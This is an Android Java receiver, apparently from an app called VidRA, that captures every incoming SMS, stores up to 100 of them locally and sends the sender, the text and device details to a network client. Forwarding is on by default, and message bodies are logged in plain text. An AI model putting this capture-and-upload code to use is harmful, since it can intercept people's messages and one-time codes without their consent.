package com.vidra.vidra_app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "VidRA_SMS";

    private static final String SETTINGS_PREFS = "vidra_sender_settings";
    private static final String STORAGE_PREFS = "vidra_native_storage";

    private static final String KEY_SMS_FORWARDING = "smsForwarding";
    private static final String KEY_DEVICE_NAME = "deviceName";
    private static final String KEY_DEVICE_ID = "deviceId";

    private static final String SMS_LIST_KEY = "sms_messages";
    private static final int MAX_MESSAGES = 100;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (context == null || intent == null) {
            return;
        }

        if (!isSmsForwardingEnabled(context)) {
            Log.d(TAG, "SMS forwarding disabled");
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) {
            return;
        }

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null || pdus.length == 0) {
            return;
        }

        String format = bundle.getString("format");
        String sender = "";
        StringBuilder bodyBuilder = new StringBuilder();

        for (Object pdu : pdus) {
            SmsMessage smsMessage = createSmsMessage(pdu, format);

            if (smsMessage == null) {
                continue;
            }

            if (sender.isEmpty()) {
                sender = smsMessage.getDisplayOriginatingAddress();
            }

            String part = smsMessage.getMessageBody();
            if (part != null) {
                bodyBuilder.append(part);
            }
        }

        String body = bodyBuilder.toString();

        if (sender.isEmpty() && body.isEmpty()) {
            return;
        }

        long receivedAt = System.currentTimeMillis();
        String deviceName = getDeviceName(context);
        String deviceId = getDeviceId(context);

        Log.d(TAG, "Incoming SMS captured");
        Log.d(TAG, "Device name: " + deviceName);
        Log.d(TAG, "Device id: " + deviceId);
        Log.d(TAG, "From: " + sender);
        Log.d(TAG, "Body: " + body);

        JSONObject payload = buildPayload(sender, body, deviceName, deviceId, receivedAt);

        saveSmsLocally(context, payload);
        NetworkClient.sendEvent(payload);
    }

    private boolean isSmsForwardingEnabled(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(
                SETTINGS_PREFS,
                Context.MODE_PRIVATE
        );

        return prefs.getBoolean(KEY_SMS_FORWARDING, true);
    }

    private String getDeviceName(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(
                SETTINGS_PREFS,
                Context.MODE_PRIVATE
        );

        String savedName = prefs.getString(KEY_DEVICE_NAME, null);

        if (savedName != null && !savedName.trim().isEmpty()) {
            return savedName.trim();
        }

        return Build.MANUFACTURER + " " + Build.MODEL;
    }

    private String getDeviceId(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(
                SETTINGS_PREFS,
                Context.MODE_PRIVATE
        );

        String savedId = prefs.getString(KEY_DEVICE_ID, null);

        if (savedId != null && !savedId.trim().isEmpty()) {
            return savedId.trim();
        }

        return "";
    }

    private SmsMessage createSmsMessage(Object pdu, String format) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return SmsMessage.createFromPdu((byte[]) pdu, format);
            }

            return SmsMessage.createFromPdu((byte[]) pdu);
        } catch (Exception e) {
            Log.e(TAG, "Failed to parse SMS", e);
            return null;
        }
    }

    private JSONObject buildPayload(
            String sender,
            String body,
            String deviceName,
            String deviceId,
            long receivedAt
    ) {
        JSONObject payload = new JSONObject();

        try {
            payload.put("id", String.valueOf(receivedAt));
            payload.put("type", "sms");
            payload.put("sender", sender);
            payload.put("title", sender);
            payload.put("text", body);
            payload.put("deviceName", deviceName);
            payload.put("deviceId", deviceId);
            payload.put("status", "received");
            payload.put("receivedAt", receivedAt);
        } catch (Exception e) {
            Log.e(TAG, "Failed to build SMS payload", e);
        }

        return payload;
    }

    private void saveSmsLocally(Context context, JSONObject message) {
        try {
            SharedPreferences prefs = context.getSharedPreferences(
                    STORAGE_PREFS,
                    Context.MODE_PRIVATE
            );

            String currentJson = prefs.getString(SMS_LIST_KEY, "[]");
            JSONArray oldMessages = new JSONArray(currentJson);
            JSONArray newMessages = new JSONArray();

            newMessages.put(message);

            int limit = Math.min(oldMessages.length(), MAX_MESSAGES - 1);
            for (int i = 0; i < limit; i++) {
                newMessages.put(oldMessages.getJSONObject(i));
            }

            prefs.edit()
                    .putString(SMS_LIST_KEY, newMessages.toString())
                    .apply();

            Log.d(TAG, "SMS saved locally");
        } catch (Exception e) {
            Log.e(TAG, "Failed to save SMS locally", e);
        }
    }
}